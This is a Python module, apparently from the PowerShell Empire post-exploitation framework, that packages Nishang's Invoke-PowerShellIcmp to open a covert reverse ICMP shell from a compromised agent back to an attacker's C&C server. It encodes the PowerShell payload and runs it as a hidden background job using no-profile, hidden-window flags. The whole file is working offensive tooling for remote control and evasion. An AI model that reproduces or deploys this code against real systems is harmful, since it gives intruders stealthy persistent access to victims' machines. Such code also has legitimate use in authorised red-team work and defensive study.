from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-PowersShellIcmp',

            'Author': ['@IronSpivi'],

            'Description': ("Runs Invoke-PowerShellIcmp by Nikhil 'SamratAshok' Mittal "
                            "To establish reverse ICMP shell for covert C&C. "
                            "Based on the original works of Bernardo 'inquisb' Damele"),

            'Background' : False,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : True,

            'MinPSVersion' : '2',

            'Comments': [
                'https://github.com/samratashok/nishang'
                'https://github.com/inquisb/icmpsh'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'IPAddress' : {
                'Description'   :   'IP address of the c&c server. (Empire server default)',
                'Required'      :   True,
                'Value'         :   helpers.lhost()
            },
            'BufferSize' : {
                'Description'   :   'Size of output buffer',
                'Required'      :   False,
                'Value'         :   '128'
            },
            'Delay': {
                'Description': 'Time in seconds for which the script waits for a command from the server',
                'Required': False,
                'Value': '5'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):
        raw_input(helpers.color("[!] Don't forget to run \"systemctl -w net.ipv4.icmp_echo_ignore_all=1\" "
                                "(Press return to continue)", color="Red"))
        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/management/Invoke-PowerShellIcmp.ps1"

        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script_decoded = moduleCode

        script_decoded += "Invoke-PowerShellIcmp"

        for option, values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    script_decoded += " -" + str(option) + " " + str(values['Value'])

        script = "start-job {powershell -nop -noni -w hidden -e " + helpers.enc_powershell(script_decoded) + "}"
        return script
